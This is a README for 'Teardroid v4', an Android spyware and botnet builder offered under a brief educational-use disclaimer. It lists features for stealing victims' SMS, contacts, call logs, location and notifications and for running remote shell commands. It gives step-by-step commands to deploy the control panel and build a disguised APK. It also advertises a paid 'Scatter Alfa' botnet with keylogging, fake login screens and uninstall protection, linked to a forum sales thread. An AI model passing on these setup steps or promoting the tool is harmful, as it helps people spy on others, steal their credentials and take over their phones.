### :warning:Disclaimer : This software is meant for educational purposes only. I'm not responsible for any malicious use of the app.

# :robot: Teardroid v4

![Screenshot](https://raw.githubusercontent.com/ScRiPt1337/Teardroid-phprat/master/img/IMG-20220122-WA0000_RdKN5Rv3U.jpg)

🇮🇳 It's easy to use android botnet work without port forwarding, vps and android studio

[![GitHub issues](https://img.shields.io/github/issues/ScRiPt1337/Teardroid-phprat)](https://github.com/ScRiPt1337/Teardroid-phprat/issues)
[![Twitter](https://img.shields.io/twitter/url?style=social&url=https%3A%2F%2Ftwitter.com%2Fhacksec42)](https://twitter.com/intent/tweet?text=Wow:&url=https://github.com/ScRiPt1337/Teardroid-phprat/)
[![Hacksec](https://img.shields.io/badge/Teardroid-4.0-red)](https://github.com/ScRiPt1337/Teardroid-phprat/)

### :rocket: Features

- Retrieve Contact
- Retrieve SMS
- Retrieve running Services
- Retrieve Device Location (:worried: Only work when the app is open on newer devices)
- Retrieve Call Logs
- Run Shell Command ( use findphno command in run shell command to get device phone number and use findx:pdf to find all the pdf files on the device )
- Change Wallpaper
- Send SMS
- Make Call
- Get Installed Apps
- Download File
- Read Notification
- Auto-Start
- Add webview in homepage
- Ignore Battery Optimisation
- Get device admin permission

![Homepage](https://raw.githubusercontent.com/ScRiPt1337/Teardroid-phprat/master/img/fakescreen.gif)

### :warning: Requirement

- Python3
- Java
- Linux or Windows os (we don't support termux use gcloud)
- For android mobile users use github Codespaces

### Java version i used

```bash
$ java -version
openjdk version "11.0.13" 2021-10-19
OpenJDK Runtime Environment (build 11.0.13+8)
OpenJDK 64-Bit Server VM (build 11.0.13+8, mixed mode)
```

### Tested on

- Windows 11
- Windows 10
- Manjaro
- Kali linux
- Ubuntu

### Deploy the Teardroid control panel on deta.sh

- Set up an account at [deta.sh](https://web.deta.sh/)
- [Click here](https://github.com/ScRiPt1337/Teardroidv4_api/fork) to fork this repo into your github account and click create fork
- Teardroidv4_api repo will be forked into your account
- Open the forked repo and click on config.py file and Change the value of "hello" to any user_agent or text you want
- https://go.deta.dev/deploy?repo=your-repo-url reaplce your-repo-url with the url of your forked repo and open it on browser
- and click deploy
- change your user-agent of the browser with the value of USER_AGENT you have enter in config.py
- you can use this chrome extension to change user useragent [extension](https://chrome.google.com/webstore/detail/custom-useragent-string/lejiafennghcpgmbpiodgofeklkpahoe)
- DONE

#### Deploy video on deta.sh

!["scatter"](https://external-content.duckduckgo.com/iu/?u=https://raw.githubusercontent.com/ScRiPt1337/Teardroid-phprat/master/img/Animation.gif)

### Run control panel on your own server

- Clone [Teardroidv4_api](https://github.com/ScRiPt1337/Teardroidv4_api) repo using the command below

```bash
$ git clone https://github.com/ScRiPt1337/Teardroidv4_api
```

- Install uvicorn

```bash
$ sudo apt-get install uvicorn
$ python3 -m pip install uvicorn
```

- Change dir to Teardroidv4_api

```bash
$ cd Teardroidv4_api
```

- Install all dependency

```bash
$ pip install -r requirements.txt
```

- change project key to connect with database
- Set up an account at [deta.sh](https://web.deta.sh/) and go to project keys and create a new key and copy it

```bash
$ nano ./db/database.py
from deta import Deta
from os import getenv

deta = Deta(getenv("DETA_PROJECT_KEY")) => deta =  Deta("demo project key")
# replace getenv("DETA_PROJECT_KEY") with your deta.sh project key
# make sure your remove getenv
```

- open config.py and change the value of "hello" to any user_agent or text you want
- Run teardroid api

```bash
$ screen
# press enter to go inside the screen session
$ uvicorn main:app --host 0.0.0.0 --port 80
# now close your terminal windows  and we are good to go
```

- Change your user-agent of the browser with the value of USER_AGENT you have enter in config.py
- you can use this chrome extension to change user useragent [extension](https://chrome.google.com/webstore/detail/custom-useragent-string/lejiafennghcpgmbpiodgofeklkpahoe)
- Done

### IMPORTANT NOTICE

- you will not be able to access the dashboard if you dont change your user-agent with the same value of USER_AGENT inside config.py file.
- its to make you the dashboard more secure and to protect it from geting auto deleted from deta.sh

### How to setup

- Clone Teardroid-phprat repo with the following command.

```bash
$ git clone https://github.com/ScRiPt1337/Teardroid-phprat
```

- cd in the Teardroid-phprat directory, then type the command below to install all dependencies

```bash
$ pip install -r requirements.txt
```

- Run the following command to see the options that we can use with the builder.

```bash
$ python Teardroid.py
[+] Checking Python Version
[+] Python Version : 3.10 ✓
  ______                    __           _     __         __ __
 /_  __/__  ____ __________/ /________  (_)___/ /  _   __/ // /
  / / / _ \/ __ `/ ___/ __  / ___/ __ \/ / __  /  | | / / // /_
 / / /  __/ /_/ / /  / /_/ / /  / /_/ / / /_/ /   | |/ /__  __/
/_/  \___/\__,_/_/   \__,_/_/   \____/_/\__,_/    |___/  /_/


Teardroid v4.0 - A tool to build teardroid spyware for Android devices. 🕷
Contact us : https://t.me/script1337 🚀
usage: Teardroid.py [-h] [-v] [-b]

options:
  -h, --help     show this help message and exit
  -v, --version  Version of Teardroid 🥴
  -b , --build   Build Teardroid with custom name [ex: Teardroid.py -b teardroid] 😷
```

- To create an apk execute the following command.

```bash
$ python Teardroid.py -b your_app_name
```

- It will prompt you with your Control Panel url enter your deta micro URL (without / at the end of the url).
- You will also be prompted for the title and text of the notification. Enter what you want to display on the notification.
- DONE

- ![Build using codespace](https://raw.githubusercontent.com/ScRiPt1337/Teardroid-phprat/master/img/625b8abb-089b-4896-98c9-43dc28ab740b.gif)

### Dashboard

- visit : https://{your server url}/v4/overview
- defualt username/password is : admin/admin

### Screenshot

- ![Builder](https://raw.githubusercontent.com/ScRiPt1337/Teardroid-phprat/master/img/Builder_3oDdS0Tr7.png)

- ![Overview](https://raw.githubusercontent.com/ScRiPt1337/Teardroid-phprat/master/img/2022-01-27_22-29_gYkI6tIvGmG.png)

- ![TaskManager](https://raw.githubusercontent.com/ScRiPt1337/Teardroid-phprat/master/img/2022-01-27_22-49_RakvqeLWG.jpeg)

### Setup Video

- video : [setup control panel and build apk using browser only](https://www.youtube.com/watch?v=GEN3GfbHPP0)

- No support will be given for teardroid v4 so please dont message me if you want help with teardroid

### Need something more advanced try ( scatter alfa )

[!["Logo"](https://external-content.duckduckgo.com/iu/?u=https://i.ibb.co/7kXYDks/20221028-233129-0000.png)](https://breached.vc/Thread-Selling-SCATTER-ALFA-ANDROID-BOTNET)

##### REAL TIME COMMUNICATION BETWEEN BECON AND SERVER

##### SUPPORT ALL THE LATEST VERSION OF ANDROID

##### STEALTHY, RESILIENT AND COST-EFFECTIVE

##### SAND-BOX AND EMULATOR DETECTION

##### ADVANCED ATTACK TECHNIQUES

##### UNKILLABLE AND UNINSTALLABLE

##### INBUILT GEO FENCING

##### EASY TO OPERATE

##### STABLE BECON

##### VNC

##### O NETWORK TRAFFIC IN IDLE MODE

### Dashboard

!["scatter"](https://external-content.duckduckgo.com/iu/?u=https://raw.githubusercontent.com/ScRiPt1337/Teardroid-phprat/master/img/scatter.png)

!["dashboard"](https://external-content.duckduckgo.com/iu/?u=https://raw.githubusercontent.com/ScRiPt1337/Teardroid-phprat/master/img/dashboard.png)

### Special features

- Forground service bypass scatter does not show any notification while running in background.
- Auto launch bypass even in Chinese phone like redmi oppo vivo without auto launch permission.
- Does \_not_create network logs in idle mode only make HTTP connection when-command.is-executed.
- Android battery optimization bypass without any permission.

### Features

- Keylogger
- logs (log everything user click on)
- notification capture
- run ussd code
- fake notification attack
- injection
- popup fake login screen
- geo fencing
- dump sms calls contact apps
- download file
- shell command
- open url
- open apps
- auto allow permission
- uninstall protection (stop the victim from uninstalling the app)
- vnc
- take screenshot
- automatically take screenshot when user open any specific app
- block number ( you can block number from victim device so the number can't call the victim )

#### Interested in scatter alfa

- Demo video available on my telegram channel => https://t.me/scatter1337
- Pm me on telegram https://t.me/script1337

### Beware from scam

- for paid project contact me on telegram
- I am only available on telegram and script1337 is my only account please double check the username

### Contact info

- Email : anon42237@gmail.com
- Telegram : https://t.me/script1337
- Visit our website : https://www.hacksec.in
